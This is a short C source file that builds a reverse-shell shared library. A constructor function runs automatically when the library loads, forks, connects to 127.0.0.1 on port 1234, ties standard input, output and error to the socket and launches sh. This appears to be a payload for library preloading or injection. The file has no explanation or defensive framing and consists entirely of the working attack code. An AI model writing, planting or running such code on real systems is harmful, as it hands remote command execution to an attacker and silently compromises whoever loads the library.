#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>

__attribute__((constructor)) void init() {
    pid_t pid = fork();

    if (pid != 0) {
        // Parent process returns immediately
        return;
    }

    int port = 1234;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    if (sockt < 0) {
        _exit(0);
    }

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) < 0) {
        close(sockt);
        _exit(0);
    }

    dup2(sockt, 0);  // stdin
    dup2(sockt, 1);  // stdout
    dup2(sockt, 2);  // stderr

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

    // If exec fails, exit silently
    // _exit(0);
}